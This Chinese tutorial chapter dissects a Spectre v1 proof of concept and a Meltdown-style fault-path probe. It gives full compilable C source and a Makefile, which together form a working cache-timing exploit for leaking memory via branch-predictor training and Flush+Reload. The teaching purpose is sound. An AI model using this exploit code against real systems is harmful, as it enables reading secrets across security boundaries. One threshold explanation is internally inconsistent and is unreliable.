---
title: Spectre v1 与 Meltdown 的源码讲解
description: 两份单文件 C 逐段拆开：负偏移怎么指回秘密值、训练循环为什么是 29 次、reload 怎么打分、信号怎么兜住故障，每段说明为什么不能换一种写法。
date: '2026-11-26'
tags: [微架构安全, Spectre, Meltdown, 侧信道, 源码]
book: microarch-00-intro
---

前面几节讲机制：[边界检查被越过](./microarch-04d-spectre-v1.md)、[页表隔离下的转移](./microarch-04e-meltdown.md)、[内核入口的页表切换](./microarch-04f-page-table-isolation.md)。这一节换个角度——把两份能直接 make 的程序摊开，一段一段说明它在做什么、为什么不能换成另一种写法。代码按段给出，段间是解释，拼起来就是完整文件。

两份都是自用测量程序：在自己机器上跑，看时序分布，看阈值能不能把信号和噪声分开。判据写在代码里，不靠“跑完了”就算数。

[[toc]]

## 先立判据

Spectre 那份要证明的是：边界检查的比较结果还没从内存回来时，预测路径上的加载已经把秘密值带进了缓存。Meltdown 那份要证明的是：故障在指令退休时才报告，而退休之前，投机窗口内的加载已经在缓存里留下了痕迹。

两者都不是“读到不该读的地址就算成功”。成功必须是可解释的时序差异——命中与未命中分成两簇，且这个分簇在多次重复里稳定。做不到，就是噪声。

## 布局：负偏移为什么能指回秘密值

```c
/* spectre.c — Spectre v1 (PHT 分支预测器训练) 最小可复现实现
 * 平台: x86-64, gcc -O0（-O2 会把边界检查重排，实验失效）
 * 编译: make spectre   /   gcc -O0 -std=c99 -o spectre spectre.c
 * 用途: 在自己机器上验证"边界检查之后的投机访存把秘密带进 cache"这一事实。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY1_SIZE          16
#define ARRAY2_SIZE          (256 * 512)
#define CACHE_HIT_THRESHOLD  80
#define TRAIN_ROUNDS         30
#define TRIES                999

static uint8_t array1[ARRAY1_SIZE] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
static uint8_t array2[ARRAY2_SIZE];
static size_t  array1_size = ARRAY1_SIZE;
static uint8_t temp = 0;

/* 受害者的"秘密"：紧挨着 array1 之前放，越界负偏移即可命中 */
static const char *secret = "The Magic Words are Squeamish Ossifrage.";
```

array1 只有 16 字节，array2 是 128 KB，正好铺成 256 条 512 字节的候选行——后面 reload 只扫这 256 条。\n
secret 是一个只读字符串，落地地址由链接器决定。程序里不硬编码偏移，而是现场求差：`secret - (char *)array1`，转成 size_t 之后负数被解释成巨大的无符号数。于是 `x < array1_size` 恒假，边界挡不住；而投机路径上 `array1[x]` 仍按溢出后的地址算，读到的正是 secret 的首字节。

这也是为什么这个实验必须**在同一台机器上编译运行**：换编译器、换链接布局，偏移就变。main 里把两个地址打印出来，就是为了偏移失效时一眼能看出来，而不是对着全点号的输出猜。

## victim：唯一的漏洞点

```c
static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();                    /* 阻止后续 load 提前发射 */
    uint64_t t = __rdtscp(&aux);     /* 序列化读取 TSC */
    _mm_lfence();
    return t;
}

/* 受害函数：唯一的漏洞点。array1_size 未命中时，边界检查要等内存，
 * 而分支预测器已经被训练成"总是进入 if"，于是 array1[x] 被投机读出，
 * 再用它当 array2 的下标 —— 秘密值就这样落进 cache 行。 */
static void victim(size_t x)
{
    if (x < array1_size)
        temp &= array2[array1[x] * 512];
}
```

四行代码，四个决定：

`if (x < array1_size)` 的比较有两个操作数。x 在寄存器里，array1_size 必须从内存取。后者被 flush 掉时，比较要等内存返回；这段时间里分支已按预测方向继续取指。

预测器靠前 29 次合法调用被训练成“进入 if”。第 30 次传恶意 x，预测仍然走“进入”，于是越界读在投机路径上发生——漏洞就在这里，不在别的任何一行。

`array1[x] * 512`：乘 512 是让每个可能的字节值落到**不同的 cache line**。64 字节一行，512 等于跳开 8 行，reload 扫 256 个候选时不会互相干扰。用 64 就会相邻值共享行，结果糊成一片。

`temp &=` 保证这次加载有消费者。如果写成 `temp = array2[...]` 或者干脆丢弃结果，编译器有权把整段投机代码删掉。

victim 单独成函数、不加 inline，是为了让边界检查与越界加载真实存在于两条路径上。-O2 下编译器可能把检查与加载合并重排，窗口消失，实验直接失效。

## readMemoryByte：四段

```c
static void readMemoryByte(size_t malicious_x, uint8_t *value, int *score)
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned junk = 0;
    volatile uint8_t *addr;
    uint64_t time1, time2;
    int best;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = TRIES; tries > 0; tries--) {
        /* 1) 清空 side channel：256 个候选 cache 行全部 flush */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /* 2) 训练 + 恶意触发 */
        for (i = 0; i < TRAIN_ROUNDS; i++) {
            _mm_clflush(&array1_size);                 /* 制造边界检查的 miss 窗口 */
            for (volatile int z = 0; z < 100; z++) {}  /* 等 flush 真正完成 */
            for (j = 29; j >= 0; j--)                  /* 29 次合法训练 */
                victim((size_t)(j % ARRAY1_SIZE));
            victim(malicious_x);                       /* 紧接一次越界 */
        }

        /* 3) reload + 计时：只对 array2 的 256 个候选行计时 */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;            /* 打乱顺序，绕开硬件预取 */
            addr = &array2[mix_i * 512];
            time1 = rdtscp_ordered();
            junk = *addr;
            time2 = rdtscp_ordered() - time1;
            if ((int)time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % ARRAY1_SIZE])
                results[mix_i]++;
        }

        /* 4) 取最高分与次高分 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
            else if (k < 0 || results[i] >= results[k]) { k = i; }
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0))
            break;                                     /* 已经足够可信 */
        best = j;
        (void)best;
    }

    results[0] ^= junk;                                /* 防止编译器把 junk 优化掉 */
    *value = (uint8_t)j;
    *score = results[j];
}
```

**清空**：256 次 clflush 覆盖全部候选行。漏掉一条，那条就以“本来就在缓存”的身份混进结果，读数立刻偏向它。

**训练**：每轮先 clflush array1_size，制造边界检查的 miss 窗口；再用 volatile 空转等失效真正完成——flush 是异步的，不等就在窗口外白测。29 次合法调用后紧接一次恶意调用，这个 29 比 5 更稳，是因为预测器在多次重复后被反复强化，跨越 flush 干扰的能力更强。

**reload**：`mix_i = (i * 167 + 13) & 255` 打乱访问顺序。顺序扫 256 行会被硬件 stride 预取器识别，把整片区域提前拉进缓存，把所有候选都变成“命中”。junk 吸收读到的值，防止优化器删掉计时区间内的加载。

**判定**：条件里额外排除 `mix_i == array1[tries % ARRAY1_SIZE]`——那是合法训练自己留下的那一行，属于已知噪声源，不排除就会周期性误判。

最后取最高分与次高分，`results[j] >= 2 * results[k] + 5` 才认；或者最高 2 分而次高 0 分也认。这是信噪比门槛，不是“跑通了”。单看最高分，噪声也能凑出高分。

## 标定与主循环

```c
/* 阈值标定：命中/未命中各测一批，取几何平均，比算术平均稳 */
static int calibrate_threshold(void)
{
    uint64_t t, hit_sum = 0, miss_sum = 0;
    unsigned aux;
    volatile uint8_t *p = &array2[0];

    for (int i = 0; i < 1000; i++) {                    /* 未命中 */
        _mm_clflush((void *)p);
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        miss_sum += rdtscp_ordered() - t;
    }
    for (int i = 0; i < 1000; i++) {                    /* 命中 */
        (void)*p;
        _mm_mfence();
        t = rdtscp_ordered();
        (void)*p;
        hit_sum += rdtscp_ordered() - t;
    }
    double hit = (double)hit_sum / 1000.0;
    double miss = (double)miss_sum / 1000.0;
    int th = (int)((hit * miss) > 0 ? __builtin_sqrt(hit * miss) : 80);
    printf("[calib] hit=%.1f miss=%.1f geometric=%.1f -> threshold=%d\n",
           hit, miss, __builtin_sqrt(hit * miss), th);
    (void)aux;
    return th;
}

int main(void)
{
    int i, score[2] = {0, 0};
    uint8_t value[2];
    size_t malicious_x;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Spectre v1 (PHT) PoC — -O0 构建\n");

    for (i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;    /* 预热，避免缺页干扰计时 */
    printf("[calib] 参考阈值 = %d (运行期实测见上)\n", calibrate_threshold());

    printf("[info] secret @ %p, array1 @ %p, delta = %ld\n",
           (const void *)secret, (const void *)array1,
           (long)(secret - (char *)array1));

    malicious_x = (size_t)(secret - (char *)array1);    /* 负偏移，溢出成巨大 size_t */

    printf("[run ] 逐字节提取：\n");
    for (i = 0; i < (int)strlen(secret); i++) {
        readMemoryByte(malicious_x + i, &value[0], &score[0]);
        readMemoryByte(malicious_x + i, &value[1], &score[1]);
        if (score[1] > score[0]) { value[0] = value[1]; score[0] = score[1]; }
        putchar(value[0] >= 32 && value[0] < 127 ? value[0] : '.');
    }
    putchar('\n');
    return 0;
}
```

calibrate_threshold 是纯测量段：未命中侧先 flush 再计时，命中侧连读两次，只为让第一次的加载把行带进缓存。两侧各 1000 次取均值，再取几何平均——不是为了让结论显得科学，是因为阈值本身要随机器浮动，硬编码的数字换台机器就废。

main 里三件事有顺序要求：先把 array2 整片写一遍（预热，避免缺页在计时区间里插一脚），再打印 secret 与 array1 的实际地址与差值（偏移失效时立刻暴露），最后逐字节提取。每个字节读两次、取分数高的那次，是最便宜的降噪：同一次投机失败不会在两次里都给出相同的假信号。
## 阈值：为什么用几何平均

```c
int th = (int)__builtin_sqrt(hit * miss);
```

命中约 40 cycles，未命中约 250 cycles，差一个数量级。算术平均给出 145，落在两个簇之间的空白带，真正的命中会被判成未命中；几何平均 sqrt(40 × 250) ≈ 100，落在两簇中间，而且对倍率变化不敏感——换台机器两个数一起变，阈值跟着走。

校准函数各测 1000 次再取，避免单次抖动。输出形如 hit=42.3 miss=247.1 geometric=102.2 -> threshold=102，与原始论文用的 80 同量级，差异来自机器与编译选项。

## Meltdown：故障、投机、三态

```c
/* meltdown_probe.c — Meltdown 类乱序读取原语的最小骨架
 * 平台: x86-64 用户态, gcc -O0
 * 编译: make meltdown_probe
 *
 * 说明（照实写）：
 *   - 该原语依赖"故障被延迟到指令退休时才报告"，投机 load 的结果在此之前
 *     已经把 array2 的某一行带进 cache。
 *   - KPTI 开启的内核里，内核页根本不在用户页表中，地址直接 fault，
 *     投机窗口拿不到数据 —— 期望结果是泄露失败，那正好是"缓解生效"的证据。
 *   - 所以这个程序真正可判定的输出是三态：LEAK / NO_LEAK / FAULT_ONLY。
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _WIN32
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#define ARRAY2_SIZE (256 * 4096)
#define RETRIES     1000
#define HIT         80

static uint8_t  array2[ARRAY2_SIZE];
static uint8_t  temp = 0;
static sigjmp_buf jbuf;
```

`*addr` 对不可读页必然触发页错误，但异常要等指令**退休**才报告。退休之前，紧随其后的 `array2[v * 4096]` 已经把某个候选行带进缓存。

sigsetjmp 和 siglongjmp 把信号转成“这次尝试失败”，而不是让进程直接死掉——这是能在用户态反复重试的前提。没有这一层，第一次 fault 就结束了。

```c
static void fault_handler(int sig) { (void)sig; siglongjmp(jbuf, 1); }

static inline uint64_t rdtscp_ordered(void)
{
    unsigned aux;
    _mm_lfence();
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static inline uint64_t time_load(volatile uint8_t *p)
{
    uint64_t t = rdtscp_ordered();
    (void)*p;
    return rdtscp_ordered() - t;
}

/* 返回 1 = 读到了字节(LEAK)，0 = 只有 fault 没有数据(FAULT_ONLY) */
static int meltdown_leak(uint8_t *addr, uint8_t *out)
{
    for (int r = 0; r < RETRIES; r++) {
        for (int c = 0; c < 256; c++)
            _mm_clflush(&array2[c * 4096]);

        volatile uint8_t v = 0;
        int faulted = 0;

        if (sigsetjmp(jbuf, 1) == 0) {
            _mm_mfence();
            v = *addr;                 /* 特权页：退休时必然 #PF */
            _mm_lfence();
            temp &= array2[v * 4096];  /* 投机窗口内顺手把它变成 cache 行 */
        } else {
            faulted = 1;
        }
        if (!faulted) {                /* 页本来就可读，不要浪费一次机会 */
            *out = v;
            return 1;
        }

        for (int c = 0; c < 256; c++) {
            if (time_load(&array2[c * 4096]) < HIT) {
                *out = (uint8_t)c;
                return 1;
            }
        }
    }
    return 0;
}
```

缓冲步长用 4096 而不是 512：这里每个候选值独占一整页，4 KB 的间隔让相邻候选绝不共享 cache line，也不共享页表项。

页表隔离生效时，内核页根本不在用户页表里，`*addr` 连投机都取不到数据，reload 全 miss，输出 NO_LEAK。这不是程序坏了，是缓解生效的证据——所以判定必须是三态，而不是成功/失败两态。

```c
int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Meltdown 类原语 — 缓解状态探针\n");

    for (int i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = fault_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);

    /* 用户态自映射的哨兵页：用 mmap 置 PROT_NONE 得到"必然 fault 的地址"，
     * 这样不需要任何特权地址也能验证 fault 路径本身工作正常。 */
    void *guard = NULL;
#if !defined(_WIN32)
    {
        extern void *mmap(void *, size_t, int, int, int, long);
        extern int mprotect(void *, size_t, int);
        guard = mmap(NULL, 4096, 3 /*RW*/, 0x22 /*PRIVATE|ANON*/, -1, 0);
        if (guard != (void *)-1 && guard) mprotect(guard, 4096, 0 /*NONE*/);
    }
#endif

    if (!guard || guard == (void *)-1) {
        printf("[skip] 无 mmap/mprotect，跳过 fault 路径自检\n");
        printf("VERDICT=NO_PROBE\n");
        return 0;
    }

    uint8_t val = 0;
    int got = meltdown_leak((uint8_t *)guard, &val);
    printf("[fault ] guard page 读取: %s value=0x%02x\n",
           got ? "有信号进入 reload 路径" : "未取得可判定信号", val);
    printf("注意: 若把 addr 换成内核地址而输出 VERDICT=NO_LEAK，即 KPTI 生效。\n");
    printf("VERDICT=%s\n", got ? "FAULT_PATH_OK" : "FAULT_PATH_BROKEN");
    return 0;
}
```

guard page 自检是这份程序里最容易被忽略的一段：用 mmap 加 PROT_NONE 造一个必然 fault 的地址，先验证“信号 → 长跳转 → 继续跑”这条路径本身是通的。如果连它都拿不到信号，问题在程序，不在 CPU，别把 FAULT_PATH_BROKEN 读成“没有漏洞”。

## makefile：两个选项不能省

```makefile
CC      ?= gcc
CFLAGS  ?= -O0 -std=c99 -fno-stack-protector -fno-pie -no-pie
LDFLAGS ?=
BINS     = spectre meltdown_probe

all: $(BINS)

spectre: spectre.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

meltdown_probe: meltdown_probe.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

run: spectre
	./spectre

clean:
	rm -f $(BINS) *.o *.exe

.PHONY: all run clean
```

-O0 的理由见上：重排会毁掉投机窗口。

-fno-pie -no-pie 是固定加载地址。开了 PIE，代码段基址每次运行都变，array1 与 secret 的相对偏移虽然不变，但你没法用打印出来的地址去核对任何东西，也没法把两次运行的结果对齐比较。

两份程序只依赖 libc 和 intrinsics，MinGW-w64 与 Linux 都能直接编。

## 判定边界

程序只回答一个问题：这一次测量里，缓存状态能不能被外部观测到。它不回答“这是不是漏洞”——那属于判定线怎么冻结的问题，见[变体与判定](./microarch-04c-variants.md)。把这两件事混在一起，输出就会被读成结论，而它只是测量。

所以那份 Meltdown 程序宁可给出三种状态，也不肯给一个“成功”。